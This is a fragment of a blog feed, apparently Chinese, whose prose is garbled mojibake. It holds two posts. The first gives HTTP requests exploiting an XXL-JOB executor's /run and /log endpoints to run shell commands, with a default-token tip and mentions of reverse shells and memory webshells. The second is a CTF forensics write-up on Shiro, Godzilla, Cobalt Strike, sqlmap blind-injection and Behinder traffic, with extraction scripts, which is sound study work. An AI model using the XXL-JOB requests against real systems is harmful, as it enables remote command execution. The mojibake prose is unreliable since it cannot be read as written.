</span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>http_Path=%2Fwww%2Fwwwroot; wp-settings-time-1=1761029415</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>325</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;jobId&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorHandler&quot;</span>: <span class="string">&quot;demoJobHandler&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorParams&quot;</span>: <span class="string">&quot;demoJobHandler&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorBlockStrategy&quot;</span>: <span class="string">&quot;COVER_EARLY&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;executorTimeout&quot;</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;logId&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;logDateTime&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;glueType&quot;</span>: <span class="string">&quot;GLUE_SHELL&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;glueSource&quot;</span>: <span class="string">&quot;id&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;glueUpdatetime&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;broadcastIndex&quot;</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;broadcastTotal&quot;</span>: <span class="number">0</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="D:\myBlog\images\xxl-job\image-20251023162908439.png" alt="image-20251023162908439"></p><p>è¿”å›200è¡¨ç¤ºæ²¡é—®é¢˜ï¼Œè¿™é‡Œ â€œglueTypeâ€: â€œGLUE_SHELLâ€,æ˜¯shellæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå®˜æ–¹è¿˜æ”¯æŒ6ç§è„šæœ¬ï¼Œä¸ºä»¥ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ä»»åŠ¡é…ç½®ï¼š</span><br><span class="line">    - è¿è¡Œæ¨¡å¼ï¼š</span><br><span class="line">        BEANæ¨¡å¼ï¼šä»»åŠ¡ä»¥JobHandleræ–¹å¼ç»´æŠ¤åœ¨æ‰§è¡Œå™¨ç«¯ï¼›éœ€è¦ç»“åˆ &quot;JobHandler&quot; å±æ€§åŒ¹é…æ‰§è¡Œå™¨ä¸­ä»»åŠ¡ï¼›</span><br><span class="line">        GLUEæ¨¡å¼(Java)ï¼šä»»åŠ¡ä»¥æºç æ–¹å¼ç»´æŠ¤åœ¨è°ƒåº¦ä¸­å¿ƒï¼›è¯¥æ¨¡å¼çš„ä»»åŠ¡å®é™…ä¸Šæ˜¯ä¸€æ®µç»§æ‰¿è‡ªIJobHandlerçš„Javaç±»ä»£ç å¹¶ &quot;groovy&quot; æºç æ–¹å¼ç»´æŠ¤ï¼Œå®ƒåœ¨æ‰§è¡Œå™¨é¡¹ç›®ä¸­è¿è¡Œï¼Œå¯ä½¿ç”¨@Resource/@Autowireæ³¨å…¥æ‰§è¡Œå™¨é‡Œä¸­çš„å…¶ä»–æœåŠ¡ï¼›</span><br><span class="line">        GLUEæ¨¡å¼(Shell)ï¼šä»»åŠ¡ä»¥æºç æ–¹å¼ç»´æŠ¤åœ¨è°ƒåº¦ä¸­å¿ƒï¼›è¯¥æ¨¡å¼çš„ä»»åŠ¡å®é™…ä¸Šæ˜¯ä¸€æ®µ &quot;shell&quot; è„šæœ¬ï¼›</span><br><span class="line">        GLUEæ¨¡å¼(Python)ï¼šä»»åŠ¡ä»¥æºç æ–¹å¼ç»´æŠ¤åœ¨è°ƒåº¦ä¸­å¿ƒï¼›è¯¥æ¨¡å¼çš„ä»»åŠ¡å®é™…ä¸Šæ˜¯ä¸€æ®µ &quot;python&quot; è„šæœ¬ï¼›</span><br><span class="line">        GLUEæ¨¡å¼(PHP)ï¼šä»»åŠ¡ä»¥æºç æ–¹å¼ç»´æŠ¤åœ¨è°ƒåº¦ä¸­å¿ƒï¼›è¯¥æ¨¡å¼çš„ä»»åŠ¡å®é™…ä¸Šæ˜¯ä¸€æ®µ &quot;php&quot; è„šæœ¬ï¼›</span><br><span class="line">        GLUEæ¨¡å¼(NodeJS)ï¼šä»»åŠ¡ä»¥æºç æ–¹å¼ç»´æŠ¤åœ¨è°ƒåº¦ä¸­å¿ƒï¼›è¯¥æ¨¡å¼çš„ä»»åŠ¡å®é™…ä¸Šæ˜¯ä¸€æ®µ &quot;nodejs&quot; è„šæœ¬ï¼›</span><br><span class="line">        GLUEæ¨¡å¼(PowerShell)ï¼šä»»åŠ¡ä»¥æºç æ–¹å¼ç»´æŠ¤åœ¨è°ƒåº¦ä¸­å¿ƒï¼›è¯¥æ¨¡å¼çš„ä»»åŠ¡å®é™…ä¸Šæ˜¯ä¸€æ®µ &quot;PowerShell&quot; è„šæœ¬ï¼›</span><br><span class="line">é¦™å¯¹åº”çš„gluetype:</span><br><span class="line">BEAN(&quot;BEAN&quot;, false, null, null),</span><br><span class="line">    GLUE_GROOVY(&quot;GLUE(Java)&quot;, false, null, null), //javaç”¨GLUE_GROOVY</span><br><span class="line">    GLUE_SHELL(&quot;GLUE(Shell)&quot;, true, &quot;bash&quot;, &quot;.sh&quot;),</span><br><span class="line">    GLUE_PYTHON(&quot;GLUE(Python)&quot;, true, &quot;python&quot;, &quot;.py&quot;),</span><br><span class="line">    GLUE_PHP(&quot;GLUE(PHP)&quot;, true, &quot;php&quot;, &quot;.php&quot;),</span><br><span class="line">    GLUE_NODEJS(&quot;GLUE(Nodejs)&quot;, true, &quot;node&quot;, &quot;.js&quot;),</span><br><span class="line">    GLUE_POWERSHELL(&quot;GLUE(PowerShell)&quot;, true, &quot;powershell&quot;, &quot;.ps1&quot;);</span><br></pre></td></tr></table></figure><p>â€œglueTypeâ€: â€œGLUE_SHELLâ€, éœ€è¦å…¶ä»–è„šæœ¬çš„æ—¶å€™åœ¨è¿™é‡Œæ›¿æ¢ã€‚<br>éœ€è¦çœ‹å›æ˜¾ï¼Œå°±æ‰“logæ¥å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /log HTTP/1.1</span><br><span class="line">Host: 192.168.133.134:9999</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: http_Path=%2Fwww%2Fwwwroot; wp-settings-time-1=1761029415</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;logId&quot;: 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\myBlog\images\xxl-job\image-20251023172933539.png" alt="image-20251023172933539"></p><p>è¿™é‡Œåœ¨æ‰“runæ¥å£çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„timeä¸èƒ½å†™æ—¶é—´æˆ³è¶…è¿‡ç°åœ¨çš„æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡äº†ä¼šæ— å›æ˜¾ã€‚è¿˜æœ‰ä¸€ä¸ªç‚¹è¦æ³¨æ„ï¼Œå°±æ˜¯æœ‰çš„ç‰ˆæœ¬ä¼šæŠ¥æ²¡æœ‰tokenï¼Œè¿™ä¸ªæ—¶å€™ä½ å°±éœ€è¦åŠ ä¸Š<code>XXL-JOB-ACCESS-TOKEN: default_token</code>æ—¢å¯ä»¥æ‰“äº†ï¼Œå¦‚æœå¼€å‘è€…æ”¹äº†ï¼Œé‚£å°±ä¸è¡Œäº†ã€‚<br>å›åˆ°ï¼Œæˆ‘ä»¬åˆšåˆšè°ˆåˆ°çš„ï¼Œå¦‚æœè¿™é‡Œæœºå™¨ä¸å‡ºç½‘ï¼Œé‚£ä¹ˆåå¼¹shellå°±ä¸èƒ½æ“ä½œï¼Œä½ æƒ³ä¸Šä¼ æ–‡ä»¶å•¥çš„ä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ¥æ‰“ğŸã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æŸé›†å›¢ctféƒ¨åˆ†wp</title>
      <link href="/2025/09/05/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/09/05/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>å‰ä¸¤å¤©ï¼Œå¤§å¸ˆå‚…è¯´ï¼Œæœ‰ä¸ªæ¯”èµ›è®©æˆ‘çœ‹çœ‹ï¼Œè¿™é‡Œè®°å½•ä»¥ä¸‹ã€‚</p><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>ç»™åˆ°ä¸€ä¸ªé™„ä»¶ï¼Œ<img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905115301596.png" alt="image-20250905115301596"></p><p>è§‚å¯Ÿæµï¼Œçœ‹åˆ°æœ‰rememberMe=çš„æµé‡ï¼Œå¤§æ¦‚ç‡æ˜¯shiroååºåˆ—åŒ–äº†ï¼Œä¸Šé¢ä¹Ÿæ‰§è¡Œäº†ä¸€äº›å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæŸ¥çœ‹flagå‘½ä»¤ï¼Œè¿™é‡Œäº†å†…å­˜é©¬<img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905115540587-17570445408121.png" alt="image-20250905115540587"></p><p>ä¸”æµé‡åé¢å¯ä»¥çœ‹åˆ°æ‰“äº†å†…å­˜é©¬ï¼Œç”¨äº†å†…å­˜é©¬ï¼Œ<img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905115643208-17570446036782.png" alt="image-20250905115643208"></p><p>ç”¨å¤§å¸ˆå‚…çš„è½¯ä»¶åç¼–è¯‘ï¼Œå¯ä»¥çœ‹åˆ°å†…å­˜é©¬çš„keyï¼Œå“¥æ–¯æ‹‰è§£å¯†ä¸éœ€è¦pwdï¼Œåªéœ€è¦keyå³å¯ï¼Œæµé‡å°‘çš„è¯ç›´æ¥å¨å­å³å¯</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905120201484.png" alt="image-20250905120201484"></p><p>çœ‹äº†å¾ˆå¤šæµæ²¡çœ‹åˆ°flagï¼Œç´¢æ€§çœ‹ä¸€ä¸‹è¯·æ±‚åŒ…ï¼Œå‘ç°æœ‰echoçš„è¯­å¥ã€‚</p><p>666c61677b63306e67723474735f74305f66316e645f7468335f7365637265745f6f465f6834636b33727d</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905135041776-17570514420363.png" alt="image-20250905135041776"></p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905135155707.png" alt="image-20250905135155707"></p><p>æœ€ä¸‹é¢æœ‰ä¸€ä¸ªflagã€‚zip,ç›´æ¥å¯¼å‡ºå³å¯ã€‚å‘ç°æ˜¯å‡çš„<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905135233842.png" alt="image-20250905135233842"></p><p>secret.zipæ˜¯çœŸçš„ã€‚</p><h3 id="misc3-xiaozhang"><a href="#misc3-xiaozhang" class="headerlink" title="misc3 xiaozhang"></a>misc3 xiaozhang</h3><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905140128431.png" alt="image-20250905140128431"></p><p>çœ‹åˆ°</p><p>POST /submit.php?id=1389642286 HTTP/1.1ï¼Œå¤§æ¦‚ç‡å°±æ˜¯csæµé‡äº†ï¼Œç»™äº†ä¸€ä¸ªrawï¼Œé‚£å¿…æ˜¯åœ¨å…¶ä¸­æ‰¾ç§é’¥äº†ï¼Œ</p><p>ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯åŸé¢˜ï¼ŒNepCTF2025 miscéƒ¨åˆ† å®¢æœå°ç¾<br>ç»™ä¸€ä¸ªå¤§å¸ˆå‚…çš„wpè¿æ¥<code>https://blog.csdn.net/edigexiong/article/details/149725919</code></p><p>è¿™é‡Œå°±ä¸åœ¨å¤ç°äº†ã€‚</p><h3 id="misc4-æ¯”èµ›æœªä½œå‡º"><a href="#misc4-æ¯”èµ›æœªä½œå‡º" class="headerlink" title="misc4 æ¯”èµ›æœªä½œå‡º"></a>misc4 æ¯”èµ›æœªä½œå‡º</h3><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªæµé‡åŒ…ï¼Œ<br>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæµé‡<img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905140808425.png" alt="image-20250905140808425"></p><p>éšä¾¿ç‚¹ä¸€ä¸ªæ˜¯sqlmapçš„æ³¨å…¥æµé‡</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905140737284.png" alt="image-20250905140737284"></p><p>é‚£å°±ç»å…¸çš„miscæ—¥å¿—åˆ†ææflagäº†ï¼Œä»¥å¾€è¿™é‡Œéƒ½æ˜¯getæµé‡ï¼Œä¸”æœ€åç”¨çš„=ï¼Œç”¨ç­‰äºçš„è¯ï¼Œç›²æ³¨åªéœ€ææœ€åä¸€ä¸ªå­—ç¬¦å³å¯ï¼Œç„¶åè¿™ä¸ªæ˜¯&gt;ï¼Œé‚£ä¹ˆå°±éœ€è¦å…·ä½“çš„è¿›è¡Œåˆ†æäº†ï¼Œ<br>id=1%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28table_name%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x73746f7265%20LIMIT%200%2C1%29%2C6%2C1%29%29%3E96%20AND%20%27SpqU%27%3D%27SpqU&amp;Submit=Submit</p><p><code>id=1&#39; AND ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73746f7265 LIMIT 0,1),6,1))&gt;96 AND &#39;SpqU&#39;=&#39;SpqU&amp;Submit=Submit</code>,æ˜¾å¡è¿™ä¸ªæµé‡,6,1))&gt;96 å¯ä»¥çœ‹åˆ°æ˜¯ç”¨çš„å¤§äºï¼Œå¦‚æœè¿™é‡Œç›´æ¥ææœ€åä¸€ä½ä¼šä¸å‡†<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905141302196.png" alt="image-20250905141302196"></p><p>ä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºsqlmapä½¿ç”¨çš„æ˜¯äºŒåˆ†æ³•ï¼Œåœ¨åˆ¤æ–­çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œ&gt;64 ï¼Œ &gt; 96ï¼Œ  &gt; 104ï¼Œè¿™æ ·åˆ¤æ–­ï¼Œæˆ‘ä»¬åªçŸ¥é“ä»–çš„ä¸Šçº¿è€Œä¸çŸ¥é“ä»–çš„ä¸‹çº¿ï¼Œæ€ä¹ˆåˆ¤æ–­&gt;64 æ˜¯å¦å¯¹ï¼Œåœ¨ç›²æ³¨é‡Œç”¨å­—ç¬¦ä¸²å¤§å°åˆ¤æ–­ï¼Œå…¶å®ä¹Ÿå°±æ˜¯åˆ¤æ–­å›æ˜¾å†…å®¹ï¼Œæ‰€ä»¥è¿™é‡Œï¼Œæˆ‘ä»¬è¦è¿›è¡Œåˆ¤æ–­å›æ˜¾å†…å®¹ï¼Œ</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905141803402.png" alt="image-20250905141803402"></p><p>æ ¹æ®å›æ˜¾å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°æ³¨å…¥çš„æ˜¯dvwaï¼Œdvwaåœ¨ç›²æ³¨æ—¶ï¼Œç”¨<pre>User ID exists in the database.</pre>åˆ¤æ–­<img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905141850145.png" alt="image-20250905141850145"></p><p>å¦‚æœæ­£ç¡®ï¼Œå°±æ˜¯User ID exists in the database.ï¼Œé”™è¯¯å°±æ˜¯\t\t<pre>User ID is MISSING from the database.</pre>\r\n</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905142018658.png" alt="image-20250905142018658"></p><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒåŒºåˆ†äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æå–æµé‡äº†ï¼Œsqlmapè·‘çš„æµé‡å¾ˆå¤šï¼Œä¸€ä¸ªä¸€ä¸ªçœ‹è‚¯å®šä¸ç°å®ï¼Œæ‰€ä»¥ç”¨è„šæœ¬æå‡ºäº†æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ï¼Œè¿™é‡Œæ³¨æ„ï¼Œå…ˆè¿›è¡Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905142216400.png" alt="image-20250905142216400"></p><p>http.responseè¿‡æ»¤ï¼Œæˆ‘ä»¬è¦æ ¹æ®å›æ˜¾åŒ…çš„å†…å®¹ï¼Œæ¥æå–è¯·æ±‚æŠ¥çš„å†…å®¹ï¼Œè§‚å¯Ÿåˆ°ï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905142317728.png" alt="image-20250905142317728"></p><p>æ•°æ®åŒ…å›æ˜¾åœ¨400å·¦å³æ—¶ï¼Œå›æ˜¾å†…å®¹æ˜¯æˆ‘ä»¬è¦åˆ°ï¼Œå–ä¸ªä¸­ï¼Œå°äº700ï¼Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># ç”¨æ³•: ./extract.sh input.pcapng output.txt</span></span><br><span class="line"></span><br><span class="line">pcap_file=<span class="variable">$1</span></span><br><span class="line">out_file=<span class="variable">$2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸´æ—¶æ–‡ä»¶ä¿å­˜ stream</span></span><br><span class="line">tmp_streams=$(mktemp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) æå–æ‰€æœ‰ http.response ä¸”åŒ…å« database. çš„ stream</span></span><br><span class="line">tshark -r <span class="string">&quot;<span class="variable">$pcap_file</span>&quot;</span> -Y <span class="string">&#x27;http.response &amp;&amp; tcp.len &lt;700&#x27;</span> \</span><br><span class="line">  -T fields -e tcp.stream | sort -u &gt; <span class="string">&quot;<span class="variable">$tmp_streams</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) æ ¹æ® stream å·æå–è¯·æ±‚+å“åº”</span></span><br><span class="line">&gt; <span class="string">&quot;<span class="variable">$out_file</span>&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> stream; <span class="keyword">do</span></span><br><span class="line">  tshark -r <span class="string">&quot;<span class="variable">$pcap_file</span>&quot;</span> -Y <span class="string">&quot;tcp.stream == <span class="variable">$stream</span>&quot;</span> \</span><br><span class="line">  -O http &gt;&gt; <span class="string">&quot;<span class="variable">$out_file</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$tmp_streams</span>&quot;</span></span><br><span class="line"></span><br><span class="line">rm <span class="string">&quot;<span class="variable">$tmp_streams</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç»“æœå·²ä¿å­˜åˆ° <span class="variable">$out_file</span>&quot;</span></span><br><span class="line">//./tiqu2.sh att.pcapng der.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæ‰¾gptå†™ä¸€ä¸ªè„šæœ¬ï¼Œå…ˆæŠŠç¬¦åˆçš„æµé‡çš„æµåºå·è¿›è¡Œæ‹¿å‡ºæ¥ï¼Œåœ¨è¿›è¡ŒæŠŠåºå·çš„æµçš„å…¨éƒ¨å†…å®¹å¯¼å‡ºã€‚ç›®å‰æ¥çœ‹åªèƒ½ç”¨è¿™ç§æ–¹å¼æäº†ï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905142642576.png" alt="image-20250905142642576"></p><p>æŸ¥çœ‹der å°±æ˜¯ç¬¦åˆæ‰€æœ‰æ¡ä»¶çš„æ•°æ®åŒ…äº†ï¼Œç„¶ååœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚åªè¦payloadå³å¯ã€‚</p><p><code>strings re.txt| grep &quot;id=1&quot; &gt; re222.txt</code></p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143029111.png" alt="image-20250905143029111"></p><p>å°±ä¼šæœ‰ä¸€å¤§å †è¿™ä¸ªæ•°æ®ï¼Œåˆ©ç”¨è„šæœ¬æå–å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> E</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\work\\za\\data3123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment">#è¯»å–a.txt</span></span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">st = urllib.parse.unquote(st)</span><br><span class="line">lis = re.findall(<span class="string">&quot;2,1\),([0-9]*),1\)\)&gt;([0-9]*)&quot;</span>,st)</span><br><span class="line"><span class="built_in">print</span>(lis)</span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    <span class="comment">#å°†æ•°å­—ä¸º1çš„ç´¢å¼•ä¸€ä¸ªä¸ªå¡«å……ï¼Œæ­£å¥½åˆ°æœ€åä¸€ä¸ªï¼Œæ¢ç´¢å¼•</span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#print(aa)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„æ­£åˆ™åˆ«å†™é”™äº†ï¼Œæ¯æ¬¡çš„æ­£åˆ™éƒ½ä¸ä¸€æ ·ï¼Œ`id=1â€™ AND ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x73746f7265 LIMIT 0,1),6,1))&gt;96 AND â€˜SpqUâ€™=â€™SpqU&amp;Submit=Submit<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143255109.png" alt="image-20250905143255109"></p><p>å¯ä»¥å¾—åˆ°å‰åŠæ®µï¼Œæ¥ä¸‹è¿˜æœ‰ååŠæ®µï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143341125.png" alt="image-20250905143341125"></p><p>åœ¨æœ€ä¸‹é¢ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ‰phpçš„æµé‡ï¼Œå¤§æ¦‚ç‡æ˜¯æœ¨é©¬çš„æµé‡äº†ï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143434964.png" alt="image-20250905143434964"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰è¿™ä¸ªrefererï¼Œè¿™å°±æ˜¯å†°èçš„æµé‡ï¼Œæˆ‘ä»¬åœ¨ä»¥å‰çš„äºŒå¼€å†°èä¸­åˆ†æè¿‡ï¼Œå†°èçš„ä½œè€…ï¼Œç‰¹æ„åŠ çš„è¿™ä¸ªrefererã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ‰¾é©¬ï¼Œæ‰¾keyï¼Œä¸€èˆ¬æ–‡ä»¶ä¸Šä¼ éƒ½æ˜¯postä¼ å‚ï¼Œç›´æ¥è¿‡æ»¤postæµé‡</p><p><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143619313.png" alt="image-20250905143619313"></p><p>ä¼¼ä¹å¹¶æ²¡æœ‰ä¸Šä¼ çš„æµé‡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œiconæµè¿›è¡Œäº†ä¸Šä¼ <br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143659689.png" alt="image-20250905143659689"></p><p>è¿™é‡Œè¿½è¸ªå¯ä»¥çœ‹åˆ°ä¸Šä¼ äº†zipï¼Œé‡Œé¢æ–‡ä»¶å«keyï¼Œå¯¼å‡ºå³å¯ï¼Œ<br><img src="/images/%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E9%83%A8%E5%88%86wp/image-20250905143831081.png" alt="image-20250905143831081"></p><p>å‘ç°è¦å¯†ç ï¼Œå†ä»æµé‡åŒ…ä¸­æ‰¾å¯†ç 